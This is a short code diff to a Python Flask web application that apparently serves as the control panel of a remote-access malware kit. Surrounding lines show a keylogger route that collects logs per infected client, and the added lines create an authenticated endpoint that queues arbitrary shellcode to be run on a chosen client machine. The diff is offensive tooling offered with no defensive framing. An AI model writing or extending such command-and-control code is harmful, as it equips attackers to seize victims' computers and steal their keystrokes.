@@ -219,6 +219,14 @@ def keylogger(client_id):
         print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
+@app.route('/run_shellcode', methods=['POST'])
+@requires_auth
+def run_shellcode():
+    client_id = request.form['client_id']
+    shellcode = request.form['shellcode']
+    commands[client_id] = f"shellcode:{shellcode}"
+    return redirect(url_for('index'))
+
 @app.route('/start_bridge', methods=['POST'])
 @requires_auth
 def start_bridge():
